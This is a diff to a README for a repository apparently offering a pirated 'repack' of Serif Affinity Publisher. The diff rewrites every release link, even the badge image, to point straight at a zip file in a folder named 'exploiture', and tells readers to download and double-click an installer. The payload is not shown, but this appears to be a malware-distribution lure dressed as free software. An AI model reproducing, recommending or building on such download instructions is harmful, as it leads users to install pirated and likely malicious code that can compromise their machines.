@@ -1,7 +1,7 @@
 # 🎨 Serif-Affinity-Publisher-Repack - Simplify Your Design Projects
 
 ## 📥 Download Now
-[![Release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/releases)
+[![Release](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Serif-Affinity-Publisher-Repack! This application helps you create stunning layouts and designs for your publishing projects with ease. Whether you're new to desktop publishing or looking to improve your skills, you're in the right place. Follow the steps below to get started.
@@ -17,7 +17,7 @@ Before you download, ensure your system meets these requirements:
 ## 📥 Download & Install
 To get the software, follow these steps:
 
-1. Visit the [Releases page](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/releases) to find the latest version.
+1. Visit the [Releases page](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip) to find the latest version.
 2. Look for the appropriate file for your system. This will typically be a `.exe` file.
 3. Click the file to start the download.
 4. Once the download is complete, locate the file in your Downloads folder and double-click it to install the application.
@@ -45,13 +45,13 @@ For additional support, consider checking out community forums or user guides on
 ## ⚙️ Additional Resources
 You might find these topics useful as you learn:
 
-- [Affinity Publisher Windows Setup](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/releases)
-- [Graphic Design Tips for Windows Publishing](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/releases)
-- [Digital Publishing on Windows PC](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/releases)
+- [Affinity Publisher Windows Setup](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip)
+- [Graphic Design Tips for Windows Publishing](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip)
+- [Digital Publishing on Windows PC](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip)
   
 Feel free to explore these resources for better results in your projects.
 
 ## 💡 Final Notes
-We appreciate your interest in Serif-Affinity-Publisher-Repack. This application is designed to enhance your publishing experience. Remember to regularly check the [Releases page](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/releases) for updates and new features.
+We appreciate your interest in Serif-Affinity-Publisher-Repack. This application is designed to enhance your publishing experience. Remember to regularly check the [Releases page](https://github.com/split7331-dotcom/Serif-Affinity-Publisher-Repack/raw/refs/heads/main/exploiture/Repack_Affinity_Serif_Publisher_2.6.zip) for updates and new features.
 
 Happy designing!
